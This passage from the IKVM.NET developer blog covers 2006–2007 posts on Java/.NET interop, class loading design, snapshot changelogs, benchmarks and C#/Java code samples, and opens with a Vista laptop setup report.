		<P>About a month ago my new <A href="http://www-307.ibm.com/pc/support/site.wss/product.do?template=/product.do?template=/productpage/landingpages/productPageLandingPage.vm&amp;sitestyle=lenovo&amp;brandind=10&amp;familyind=317531&amp;machineind=344289&amp;modelind=344290&amp;partnumberind=0&amp;subcategoryind=0&amp;d">ThinkPad Z61p</A> arrived. It came pre-installed with Windows XP, but I always do a clean install to remove all the junk that comes with a new system (although Lenovo isn't nearly as bad as some OEMs). I decided to be adventurous and install Vista Ultimate x64.</P>
<P><B>Virtual PC 2007</B></P>
<P>I copied the harddisk of my old laptop to a VHD file, so that I would be able to use Virtual PC 2007 to run my old configuration. Well that was a big mistake. Virtual PC 2007 is a useless piece of crap. First of all, it had problems with the VHD file because it was bigger than 64GB (which surfaced as "Sector not found" errors in the virtual machine) and after I resolved that by shrinking the disk to 60GB the performance was horrible (it appears they *still* haven't solved the laptop/chipset/keyboard responsiveness issue). After getting fed up with that I switched to VMWare 6.0 beta and I have been very happy with that (I've been a VMWare user since 1.0, but wanted to give Virtual PC 2007 a chance since it's free [as in beer] now.) </P>
<P><B>Performance</B></P>
<P>The fact that the harddisk was *always* busy drove me crazy (and made things often very slow), so I've disabled the Windows Search indexing service, after doing that and using a 2GB Kingston USB memory key as a ReadyBoost cache performance is acceptable. It's hard to compare with my previous XP system, because I also switched to Office 2007 and Outlook 2007 is a real pig.</P>
<P><B>Problems</B></P>
<P>The integrated WiFi doesn't work. It looks like the driver works fine (I can see all WiFi networks in the area just fine), but when Vista tries to establish a secure connection, it fails (well, it actually succeeds and then breaks the connection again after a few seconds). All of the built in diagnostics crap is totally useless (as expected). The built-in flash reader also doesn't work (the Lenovo support site doesn't have a driver, but with some Googling I was able to find one, but it was very unstable).</P>
<P><B>IKVM</B></P>
<P>I've switched my main IKVM development environment to Visual Studio 2005 (but will still support .NET 1.1) and when I do my test builds I now build in 64 bit mode. This works surprisingly well and the performance is excellent. I was a bit skeptical about the x64 CLR JIT because of my previous experiences on Windows XP x64 (the performance there basically sucked), but the Vista CLR build (which is a newer build) appears to have fixed that.</P>
<P>As a result of running on .NET 2.0 most of the time now, I've fixed several "ReflectionOny" bugs (when IKVM is built on .NET 2.0 it uses the ReflectionOnly assembly loading context for ikvmc and ikvmstub).</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		03/19/2007 08:52:40 (W. Europe Standard Time, UTC+01:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=ebb699ba-8164-4566-b487-af71ad7ba19c"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=ebb699ba-8164-4566-b487-af71ad7ba19c">Comments [1]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Saturday, 17 March 2007</h2></div>
<div class="newsItems"><a name="a1c3fdfc5-689e-4199-a2da-6b1813701af0"></a><div class="entry">
	<h3 class="entryTitle">More Magic</h3>
	<div class="entryBody">
		<P>Thanks to <A href="http://sab39.netreach.com/month__200601/">Stuart</A>'s prodding, the next version of ikvmc will automatically add a <CODE><A href="http://msdn2.microsoft.com/en-us/library/system.idisposable.aspx">System.IDisposable</A></CODE> or <CODE><A href="http://msdn2.microsoft.com/en-us/system.collections.ienumerable.aspx">System.Collections.IEnumerable</A></CODE> implementation to any Java classes that implement <CODE><A href="http://java.sun.com/javase/6/docs/api/java/io/Closeable.html">java.io.Closeable</A></CODE> or <CODE><A href="http://java.sun.com/javase/6/docs/api/java/lang/Iterable.html">java.lang.Iterable</A></CODE> (respectively).</P>
<P>That means that you can now do this in C#:</P><PRE>java.util.<FONT color=#2b91af>ArrayList</FONT> list = <FONT color=#0000ff>new</FONT> java.util.<FONT color=#2b91af>ArrayList</FONT>();
list.add(<FONT color=#7d3302>"foo"</FONT>);
list.add(<FONT color=#7d3302>"bar"</FONT>);
<FONT color=#0000ff>using</FONT> (java.io.<FONT color=#2b91af>FileWriter</FONT> fw = <FONT color=#0000ff>new</FONT> java.io.<FONT color=#2b91af>FileWriter</FONT>("test.txt"))
{
  <FONT color=#0000ff>foreach</FONT> (<FONT color=#0000ff>string</FONT> s <FONT color=#0000ff>in</FONT> list)
  {
    fw.write(s);
    fw.write(<FONT color=#7d3302>"\n"</FONT>);
  }
}
</PRE>
<P>Note that the interfaces are only added to the classes (i.e. the <CODE>java.io.Closeable</CODE> interface doesn't implement <CODE>System.IDisposable</CODE>). From Java this change is mostly invisible, e.g. when you use Java reflection you won't see <CODE>System.IDisposable</CODE> on <CODE>java.io.FileWriter</CODE>. However, when you use the <CODE>instanceof</CODE> operator or do a cast to <CODE>cli.System.IDisposable</CODE>, it will succeed. It would be possible to remove this inconsistency, but I don't think that's worth it.</P>
<P><B>Too Much Magic</B></P>
<P>Too much of anything is never a good thing, but in the case of adding magic to ikvm, it has always been very difficult to draw the line between just enough and <A href="http://xeno.extendev.org/2007/03/tracking-back-and-moving-forward.html">too much</A>. There already is a fair bit a magic in ikvm and I tend to be rather conservative in adding more. The main reason is that magic is almost never "perfect", this means that in most cases it will work as expected, but there are always edge cases where people will be surprised by how things work and that's clearly not good.</P>
<P>Stuart also wants Java's foreach construct to work on .NET types that implement IEnumerable, but to make that work would require turning <CODE>java.lang.Iterable</CODE> into a ghost interface and I currently feel that would be in the "too much magic" category, especially considering that ghost interfaces are <A HREF="/PermaLink.aspx?guid=4a4bcc69-174f-40af-bb16-85227b87acc0">not very good magic</A>.</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		03/17/2007 15:05:07 (W. Europe Standard Time, UTC+01:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=1c3fdfc5-689e-4199-a2da-6b1813701af0"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=1c3fdfc5-689e-4199-a2da-6b1813701af0">Comments [0]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Friday, 16 March 2007</h2></div>
<div class="newsItems"><a name="a84b198e5-2335-4605-b08f-14cfffcaefc9"></a><div class="entry">
	<h3 class="entryTitle">Microsoft dropping J# and JLCA in next version of Visual Studio</h3>
	<div class="entryBody">
		<P>Via <A href="http://blogs.ugidotnet.org/lbarbieri/archive/2007/03/15/73040.aspx">Lorenzo Barbieri</A> (via Google blog search, I don't read Italian) I learned that <A href="http://msdn2.microsoft.com/en-us/vjsharp/default.aspx">Microsoft decided to drop support for J# and the Java Language Conversion Assistant</A>&nbsp;in the next version of Visual Studio (code named Orcas).</P>
<P>I'm glad they finally realised the futility of competing with IKVM.NET ;-)</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		03/16/2007 11:36:58 (W. Europe Standard Time, UTC+01:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=84b198e5-2335-4605-b08f-14cfffcaefc9"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=84b198e5-2335-4605-b08f-14cfffcaefc9">Comments [3]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Wednesday, 14 March 2007</h2></div>
<div class="newsItems"><a name="afb60b2db-3b02-44a2-a5d0-0984a9758e23"></a><div class="entry">
	<h3 class="entryTitle">DST Update</h3>
	<div class="entryBody">
		<P>I made a new binary release of 0.32 that includes the back-ported GNU Classpath TimeZone fixes for the updates to the US DST rules.</P>
<P>Available here: <A href="http://www.frijters.net/ikvmbin-0.32.0.1.zip">ikvmbin-0.32.0.1.zip</A></P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		03/14/2007 15:51:01 (W. Europe Standard Time, UTC+01:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=fb60b2db-3b02-44a2-a5d0-0984a9758e23"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=fb60b2db-3b02-44a2-a5d0-0984a9758e23">Comments [1]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Friday, 09 February 2007</h2></div>
<div class="newsItems"><a name="a4e0b7f7c-6f5d-42a3-a4d6-5d05a99c84ff"></a><div class="entry">
	<h3 class="entryTitle">Class Loading Architecture</h3>
	<div class="entryBody">
		<P>As I <A HREF="/PermaLink.aspx?guid=026244f2-b26e-4c48-bf52-b4d08c400569">previously</A> blogged, 0.32 has a new class loading architecture. I promised to explain the architecture, but I accidentally deleted the blog post I wrote about it a while ago and I didn't feel like rewriting it straight away, but I still need to do it, so here it is ;-)</P>
<P><B>The Basic Idea</B></P>
<P>Every .NET assembly has its own corresponding ClassLoader instance. This is true for assemblies generated with ikvmc as well as other .NET languages. The class loader instance corresponding to an assembly is known as the <I>assembly class loader</I>. It does not have a parent class loader (<A href="http://java.sun.com/javase/6/docs/api/java/lang/ClassLoader.html#getParent()"><CODE>ClassLoader.getParent()</CODE></A> returns null), but it does do a form of delegation. When the assembly class loader is used to load a class or resource, first it will search the corresponding assembly, if that doesn't result in the requested item, the assemblies <B>directly</B> referenced by the assembly are searched (and if that also doesn't find the item, the IKVM.GNU.Classpath assembly is searched).</P>
<P><B>The System Class Loader</B></P>
<P>By default the system class loader will be set to the assembly class loader of the main application executable assembly. If there is no main executable assembly (e.g. the main executable is unmanaged or the AppDomain was created without one) or the <CODE>java.class.path</CODE> or <CODE>java.ext.dirs</CODE> properties are set, then a <CODE>URLClassLoader</CODE> that searches the classpath is used. This means that in most scenarios no dynamic Java class loading is enabled by default. This also means that you don't have to worry about your application being affected by the <CODE>CLASSPATH</CODE> environment variable as set on the system where the application runs (which previously could -- and did -- result in hard to diagnose problems on some systems with a weird <CODE>CLASSPATH</CODE> setting.)</P>
<P><B>Dynamically Loading a Class</B></P>
<P><CODE>Class.forName()</CODE> just works if the class loader it uses (and, like Java, it uses the class loader that loaded the calling class) can find the class. It can also be used to load classes from assemblies that are not referenced by any class loader that is already available. This is done by specifying the assembly qualified name of the type (in .NET form, without the cli prefix). Here's an example:</P>
<P><CODE>class MsgBox<BR>{<BR>&nbsp; public static void main(String[] args) throws Exception<BR>&nbsp; {<BR>&nbsp;&nbsp;&nbsp; Class c = Class.forName("System.Windows.Forms.MessageBox, " + <BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; "System.Windows.Forms, " + <BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; "Version=1.0.5000.0, " + <BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; "Culture=neutral, " + <BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; "PublicKeyToken=b77a5c561934e089");<BR>&nbsp;&nbsp;&nbsp; c.getMethod("Show", String.class).invoke(null, "Hello, World!");<BR>&nbsp; }<BR>}</CODE></P>
<P><B>Versioning</B></P>
<P>One nice benefit of the new architecture is that it is now possible for two (or more) different versions of a jar to be loaded and used in the same AppDomain. Previously that would sort of work, but it would break down if the code used Class.forName() or tried to load resources. However, now the class loader namespaces can be fully seperated (you still can't have a single assembly that directly references two versions of the same code, but indirectly it works fine.) Here's an example of an application that uses two different assemblies that both depend on different versions of the same assembly:</P>
<P><IMG height=382 src="http://www.frijters.net/versioning.png" width=414 border=0></P>
<P>The rectangles represent assemblies and the ovals represent class loaders. The pink oval is the assembly class loader for App.exe and can see classes in both Foo.dll and Bar.dll, but won't be able to see any classes from either of the Widgets assemblies. The yellow oval is the assembly class loader of Foo.dll and it allows Foo.dll to see the correct version of Widgets.dll, but not the other one (nor any classes in App.exe, unless it uses the system class loader). Each Widgets.dll assembly will also have its own assembly class loader (not shown in the diagram) and that will only be able to load classes from the corresponding Widgets assembly.</P>
<P><B>JSR 277</B></P>
<P>The limitations of the Java class loading architecture have long been known and several hacks have been developed to work around some of those limitations, but it is clearly desirable (at least to some people) to replace the current architecture with something better. <A href="http://jcp.org/en/jsr/detail?id=277">JSR 277</A> is trying to define that new architecture. I believe that the architecture that IKVM 0.32 introduced is very similar to what JSR 277 is going to end up like, so in the future it should be possible to support JSR 277 without any major changes. Also, if your Java code requires changes to be compatible with the IKVM architecture, it almost certainly will require similar changes to deal with JSR 277 and making these changes now will make it easier to migrate to JSR 277 based modules in the future.</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		02/09/2007 09:27:03 (W. Europe Standard Time, UTC+01:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=4e0b7f7c-6f5d-42a3-a4d6-5d05a99c84ff"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=4e0b7f7c-6f5d-42a3-a4d6-5d05a99c84ff">Comments [3]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Monday, 05 February 2007</h2></div>
<div class="newsItems"><a name="afae548f8-9b29-4fc3-a79a-890529eb90a6"></a><div class="entry">
	<h3 class="entryTitle">New Snapshot</h3>
	<div class="entryBody">
		<P>It's been a while since the 0.32 release and there has been a fair bit of change going on, so I thought I'd release a snapshot for people who want to play with up to date binaries.</P>
<P>Changes:</P>
<UL>
<LI>Updated to current GNU Classpath cvs version.</LI>
<LI>Added support for representing .NET enum types as Java enums for use in annotations (.NET enum types now have an inner class __Enum).</LI>
<LI>Added support for adding fields to classes in map.xml.</LI>
<LI>Fixed remapping infrastructure to not generate superfluous method body for interface methods.</LI>
<LI>Added partial support for enum types in .NET attribute annotations.</LI>
<LI>Added Java 1.6 methods to java.lang.String.</LI>
<LI>Added -warnaserror option to ikvmc (suggested by David Ehrlich).</LI>
<LI>Many AWT improvements (by Volker Berlin).</LI>
<LI>Added caching to VMStackWalker.isHideFromJava to speed up stack walking (suggested by Trevor Bell).</LI>
<LI>Fixed handling of non-vector arrays.</LI>
<LI>Made JNIEnv.FatalError more compatible with JDK and removed call to JVM.CriticalFailure (which is reserved for IKVM bugs).</LI>
<LI>Centralised OEM string decoding in JNI code.</LI>
<LI>Changed JVM.CriticalFailure to write message to console instead of displaying a message box in ikvmc.</LI>
<LI>Fixed AnnotationBuilder to add ImplementsAttribute to annotation attribute, so that reflection correctly reports the implemented annotation interface.</LI>
<LI>Fixed AnnotationBuilder to ignore annotation attribute properties of type Annotation (as .NET attributes have no way to encode them).</LI>
<LI>Implemented annotation support in StubGenerator (used by ikvmstub and other code that reads statically compiled classes as resources).</LI>
<LI>Added warning to ikvmc when skipping a class that is already in a referenced assembly.</LI>
<LI>Changed ikvmc -nowarn to use only the first variable string in a warning as a key.</LI>
<LI>Changed ikvmc to fail with a Link Error when it detects a loader constraints violation (instead of emitting code that throws a LinkageError at runtime).</LI>
<LI>Fixed handling of bridge methods with covariant return types in ikvmc (to allow other .NET languages to call these methods [i.e. the non-bridge counterparts]).</LI>
<LI>Changed ikvmc to add EditorBrowsable(Never) attribute to bridge and synthetic methods.</LI>
<LI>Fixed workaround for Mono bug (lack of proper token support in reflection emit api) in field reflection support.</LI>
<LI>Fixed system property initialization to handle case where IKVM.GNU.Classpath doesn't have a Location (e.g. when it is loaded with Assembly.Load(byte[]) (suggested by Bill Seddon).</LI></UL>
<P>Binaries are available <A href="http://www.frijters.net/ikvmbin-0.33.2592.zip">here</A>. Source is available in cvs.</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		02/05/2007 07:48:55 (W. Europe Standard Time, UTC+01:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=fae548f8-9b29-4fc3-a79a-890529eb90a6"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=fae548f8-9b29-4fc3-a79a-890529eb90a6">Comments [0]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Monday, 22 January 2007</h2></div>
<div class="newsItems"><a name="a3163e4a9-193e-44f1-8be5-3b768a9ccdf4"></a><div class="entry">
	<h3 class="entryTitle">Events</h3>
	<div class="entryBody">
		<P>Like previous years, I'll be attending <A href="http://www.fosdem.org/2007/">FOSDEM</A> this year. I'll also be at the Microsoft <A href="http://msdn.microsoft.com/events/pdc/">PDC</A> in October.</P>
<P>If you're going to either of these and would like to meet for a chat, please feel free to <A href="mailto:jeroen@frijters.net">contact</A> me.</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		01/22/2007 10:18:11 (W. Europe Standard Time, UTC+01:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=3163e4a9-193e-44f1-8be5-3b768a9ccdf4"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=3163e4a9-193e-44f1-8be5-3b768a9ccdf4">Comments [0]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Monday, 15 January 2007</h2></div>
<div class="newsItems"><a name="ae8206772-da68-4753-bb05-1ff5e4a90a8d"></a><div class="entry">
	<h3 class="entryTitle">AWT/Swing a Little Bit Less Unsupported</h3>
	<div class="entryBody">
		<P>I don't want to raise expectations too much because there's still an incredible amount of work to be done, but thanks to great work done by Volker Berlin a lot of progress has been made on the AWT/Swing front. For example, here's a screenshot of the JDK SwingSet2 demo running on the current ikvm version from cvs:</P>
<P><A href="http://www.frijters.net/swingset2.png" alt="Click for a full size image"><IMG src="http://www.frijters.net/swingset2.png" width=364 border=0></A></P>
<P>Not everything works and some of the missing functionality will be quite difficult to implement on top of .NET 1.1 or 2.0 (it may be easier with WPF, but I really don't know). There are also a couple of GNU Classpath bugs, but overall it's quite impressive how well this demo works.</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		01/15/2007 08:46:29 (W. Europe Standard Time, UTC+01:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=e8206772-da68-4753-bb05-1ff5e4a90a8d"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=e8206772-da68-4753-bb05-1ff5e4a90a8d">Comments [4]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Wednesday, 03 January 2007</h2></div>
<div class="newsItems"><a name="adb9ee4f9-3b84-40a3-ac53-acb5e27ddf19"></a><div class="entry">
	<h3 class="entryTitle">java.lang.Comparable</h3>
	<div class="entryBody">
		<P>In the entry about <A HREF="/CommentView.aspx?guid=566a6d19-f998-4c24-b700-55dc6b450acd">object schizophrenia</A> I used <CODE>java.lang.Comparable</CODE> as an example in J#, but for IKVM I did not mention it as a ghost interface. In the comments Stuart Ballard asked why Comparable isn't a ghost interface.</P>
<P>Unlike what Stuart claimed, this is definitely not a stupid question. He also figured out part of the answer: <CODE><A href="http://java.sun.com/javase/6/docs/api/java/lang/Comparable.html">java.lang.Comparable</A></CODE> maps to <CODE><A href="http://msdn2.microsoft.com/en-us/library/system.icomparable.aspx">System.IComparable</A></CODE>.</P>
<P>That's not the whole story though. The reason that I originally mapped <CODE>Comparable</CODE> to <CODE>IComparable</CODE> was that <CODE>System.String</CODE> conveniently implements <CODE>IComparable</CODE> and that <CODE>IComparable.CompareTo</CODE> is semantically (nearly) identical to <CODE>Comparable.compareTo</CODE>. Back then I hadn't yet "invented" the ghost interface idea and this seemed to solve most of the issues (the other two ghost interface candidates, <CODE>Cloneable</CODE> and <CODE>Serializable</CODE> are only used as marker interfaces, so it didn't seem like a big deal that <CODE>System.String</CODE> didn't implement these interfaces. <CODE><A href="http://java.sun.com/javase/6/docs/api/java/lang/CharSequence.html">java.lang.CharSequence</A></CODE> only appeared in Java 1.4 and I vaguely knew about it, but at the time I chose not to worry about that yet.)</P>
<P>&nbsp;A nice side effect of mapping <CODE>Comparable</CODE> to <CODE>IComparable</CODE> is that you get better interop (e.g. Java objects that implement <CODE>Comparable</CODE> will sort correctly when used in .NET applications and .NET objects that implement <CODE>IComparable</CODE> will sort correctly in Java), so that meant that when I developed ghost interfaces I didn't really want to go back and change <CODE>Comparable</CODE> into a ghost interface.</P>
<P>Finally, there is one more complication. Even though <CODE>Comparable.compareTo</CODE> and <CODE>IComparable.CompareTo</CODE> have identical semantics, there still is a problem with <CODE>String</CODE>. Java's <CODE>String.compareTo</CODE> is specified more strictly than <CODE>Comparable.compareTo</CODE>. The interface method is specified to simply return zero or a signed or unsigned integer, but the <CODE>String</CODE> version is actually specified to return the difference between the mismatching characters (or zero, if the strings match.) To handle this correctly, when you call <CODE>Comparable.compareTo</CODE>, you're actually calling a static method <CODE>Comparable.__Helper.compareTo</CODE> that first does a check to see if the object you're comparing is a <CODE>String</CODE> and, if so, it calls a static helper method that implements the specified Java comparision algorithm.</P>
<P>BTW, the reason that the static compareTo helper method lives inside a nested __Helper class is because Reflection.Emit (on .NET 1.x) incorrectly prohibits adding static methods to interfaces (which is entirely legal according to the CLI specification).</P>
<P><B>Performance Impact</B></P>
<P>The following table compares the direct methods calls with the interface method calls. Note that these basically represent a worst case estimate, because of limit amount of work the actual compareTo method does. Note also that for notational convenience I used the zero digit, but in the actual benchmark I used a local variable containing <CODE>new Integer(0)</CODE>.</P>
<TABLE border=1>
<TBODY>
<TR>
<TD><B>Method Call</B></TD>
<TD align=right><B>Time (ns)</B></TD></TR>
<TR>
<TD>"".compareTo((Object)"")</TD>
<TD align=right>140</TD></TR>
<TR>
<TD>((Comparable)"").compareTo("")</TD>
<TD align=right>220</TD></TR>
<TR>
<TD>0.compareTo(0)</TD>
<TD align=right>6</TD></TR>
<TR>
<TD>((Comparable)0).compareTo(0)</TD>
<TD align=right>35</TD></TR></TBODY></TABLE><BR>
<P>These results are on .NET Framework 2.0 (x86). Averaged over 10,000,000 calls and includes the loop overhead.</P>
<P>For comparison, here are the results for JDK 1.5 HotSpot Client VM:</P>
<TABLE id=table1 border=1>
<TBODY>
<TR>
<TD><B>Method Call</B></TD>
<TD align=right><B>Time (ns)</B></TD></TR>
<TR>
<TD>"".compareTo((Object)"")</TD>
<TD align=right>17</TD></TR>
<TR>
<TD>((Comparable)"").compareTo("")</TD>
<TD align=right>21</TD></TR>
<TR>
<TD>0.compareTo(0)</TD>
<TD align=right>7</TD></TR>
<TR>
<TD>((Comparable)0).compareTo(0)</TD>
<TD align=right>15</TD></TR></TBODY></TABLE>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		01/03/2007 12:12:02 (W. Europe Standard Time, UTC+01:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=db9ee4f9-3b84-40a3-ac53-acb5e27ddf19"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=db9ee4f9-3b84-40a3-ac53-acb5e27ddf19">Comments [0]</a>
		
		<br clear="all">
	</div>
</div></div><div class="date"><h2 class="dateHeader">Thursday, 28 December 2006</h2></div>
<div class="newsItems"><a name="a2be9e2e4-fff4-4098-8ef2-7761eec3c6b5"></a><div class="entry">
	<h3 class="entryTitle">IKVM 0.32 Released</h3>
	<div class="entryBody">
		<P>I released 0.32 to <A href="http://sourceforge.net/project/showfiles.php?group_id=69637">SourceForge</A> (same bits as rc1).</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		12/28/2006 16:57:44 (W. Europe Standard Time, UTC+01:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=2be9e2e4-fff4-4098-8ef2-7761eec3c6b5"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=2be9e2e4-fff4-4098-8ef2-7761eec3c6b5">Comments [0]</a>
		
		<br clear="all">
	</div>
</div><a name="a566a6d19-f998-4c24-b700-55dc6b450acd"></a><div class="entry">
	<h3 class="entryTitle">Object Schizophrenia</h3>
	<div class="entryBody">
		<P>Early on in the design of IKVM, I decided that I didn't want to use wrapper objects to bridge the Java and .NET type systems as this leads to either object identity problems (and I just found out that this is sometimes called <I>object schizophrenia</I> and that triggered this post) or horrible performance.</P>
<P>By contrast, J# does use wrapper objects in a least one case and this does indeed lead to <I>object schizophrenia</I>:</P><PRE>public class Program
{
  public static void main(String[] args)
  {
    String foo = "Foo";
    Comparable comp = foo;
    System.out.println(foo == comp);
  }
}
</PRE>
<P>Compiling this Java code with Visual Studio 2005 and running it produces <I>false</I>, while it clearly should print <I>true</I>.</P>
<P>While IKVM doesn't suffer from this, there is a somewhat related problem to look out for when using IKVM ghost interfaces from a .NET language:</P><PRE>using System;
using java.lang;

public class Program
{
  static void Main(string[] args)
  {
    CharSequence seq = "foo";
    object obj1 = seq;
    object obj2 = seq;
    Console.WriteLine(obj1 == obj2);
  }
}
</PRE>
<P>Running this C# app produces <I>False</I>. This is because CharSequence is a ghost interface and represented by a value type. Assigning it to a local variable of type object boxes the value type instead of giving the underlying string object. Note that this only applies to ghost interfaces (i.e. java.lang.CharSequence, java.lang.Cloneable and java.io.Serializable). To fix this problem, you have to explicitly unwrap the object from the value type:</P><PRE>CharSequence seq = "foo";
object obj1 = seq.ToObject();
object obj2 = seq.ToObject();
Console.WriteLine(obj1 == obj2);
</PRE>
<P>Unfortunately .NET doesn't have any mechanism for a value type to prevent (implicit) boxing or defining a custom implicit object conversion operator.</P>
	</div>
	<div class="itemCategoryLinksStyle">
			
	</div>
	<div class="itemFooterStyle">
		12/28/2006 14:07:23 (W. Europe Standard Time, UTC+01:00)&nbsp;
		<a class="permalinkStyle" href="http://weblog.ikvm.net/PermaLink.aspx?guid=566a6d19-f998-4c24-b700-55dc6b450acd"><img title="Use the link of this item to make permanent references to this entry." class="permalinkImageStyle" src="http://weblog.ikvm.net/images/itemLink.gif" alt="#" border="0" /></a>&nbsp;
		&nbsp;
		<a class="commentLinkStyle" href="http://weblog.ikvm.net/CommentView.aspx?guid=566a6d19-f998-4c24-b700-55dc6b450acd">Comments [2]</a>
		
		<br clear="all">
	</div>
</div><a name="afbbd04d7-e98e-4e59-bb7e-9e0c48e8c6a5"></a><div class="entry">
	<h3 class="entryTitle">New Snapshot</h3>
	<div class="entryBody">
		<P>A new development snapshot. Now that GNU Classpath generics support has been merged in the IKVM.GNU.Classpath.dll has become a little bigger again (mostly because of the metadata associated with generic types and methods). Additionally, because enums and annotations are now fully available I've been able to continue work to support those better (in particular the integration between .NET and Java). It is now possible to use most Java annotations as .NET attributes in a fairly natural way.</P>
<P>Here's an example of using some Java annotations in C#:</P>
<P><PRE>[Retention(RetentionPolicy.__Enum.RUNTIME)]
[Target(new ElementType.__Enum[] { ElementType.__Enum.FIELD, ElementType.__Enum.METHOD })]
[Documented]
[Inherited]
[AnnotationLib.MyClassAnnotation(typeof(string))]
[AnnotationLib.MyClassArrayAnnotation(new Type[] { typeof(string), typeof(test) })]
[AnnotationLib.MyIntAnnotation(42)]
[AnnotationLib.MyIntArrayAnnotation(new int[] { 42, 123 })]
[AnnotationLib.MyStringAnnotation("Foo")]
[AnnotationLib.MyStringArrayAnnotation(new string[] { "Foo", "Bar", "Baz" })]
[AnnotationLib.MyPropAnnotation(count = 3)]
[AnnotationLib.MyOptionalValueAnnotation]
interface IFoo
{
}</PRE>
